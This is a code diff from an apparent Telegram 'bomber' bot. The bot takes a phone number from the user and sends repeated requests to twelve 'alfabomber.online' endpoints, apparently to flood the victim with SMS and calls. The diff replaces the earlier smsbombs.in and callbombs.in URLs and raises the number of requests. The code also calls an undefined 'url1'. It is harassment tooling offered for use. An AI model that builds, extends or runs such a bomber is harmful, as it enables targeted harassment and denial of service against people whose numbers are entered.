@@ -80,26 +80,45 @@ def sp(message):
             return
        
         bot.send_message(message.chat.id, "<strong>⚠️ Note - Click /stop For Stop Bomber 💣</strong>", parse_mode="html")
-        url = "https://smsbombs.in/Test.php??"
+        url = "https://alfabomber.online/urls/Url.php??"
+        url2 = "https://alfabomber.online/urls/Url2.php??"
+        url3 = "https://alfabomber.online/urls/Url3.php??"
+        url4 = "https://alfabomber.online/urls/Url4.php??"
+        url5 = "https://alfabomber.online/urls/Url5.php??"
+        url6 = "https://alfabomber.online/urls/Url6.php??"
+        url7 = "https://alfabomber.online/urls/Url7.php??"
+        url8 = "https://alfabomber.online/urls/Url8.php??"
+        url9 = "https://alfabomber.online/urls/Url9.php??"
+        url10 = "https://alfabomber.online/urls/Url10.php??"
+        url11 = "https://alfabomber.online/urls/Url11.php??"
+        url12 = "https://alfabomber.online/urls/Url12.php??"
         params = {
-            "number": msg,
+            "alfabomb": msg,
             "submit": "Submit"
         }
         payload = {
             "mobile": msg
         }
         response = requests.get(url, params=params)
-        response1 = requests.get(url, params=params)
-        url2 = "https://callbombs.in/Test.php??"
-        params2 = {
-            "number": msg,
-            "submit": "Submit"
-        }
-        payload = {
-            "mobile": msg
-        }
-        response2 = requests.get(url2, params=params2)
-        response3 = requests.get(url2, params=params2)
+        response1 = requests.get(url2, params=params)
+        response2 = requests.get(url3, params=params)
+        response3 = requests.get(url4, params=params)
+        response4 = requests.get(url5, params=params)
+        response5 = requests.get(url6, params=params)
+        response6 = requests.get(url7, params=params)
+        response7 = requests.get(url8, params=params)
+        response8 = requests.get(url9, params=params)
+        response9 = requests.get(url10, params=params)
+        response10 = requests.get(url11, params=params)
+        response11 = requests.get(url12, params=params)
+        response12 = requests.get(url1, params=params)
+        response13 = requests.get(url2, params=params)
+        response14 = requests.get(url3, params=params)
+        response15 = requests.get(url4, params=params)
+        response16 = requests.get(url5, params=params)
+        response17 = requests.get(url6, params=params)
+        response18 = requests.get(url7, params=params)
+        response19 = requests.get(url8, params=params)
 
         if msg == "1124069180":
             bot.send_message(message.chat.id, "<strong>⚠️ Hello !</strong>", parse_mode=" html")
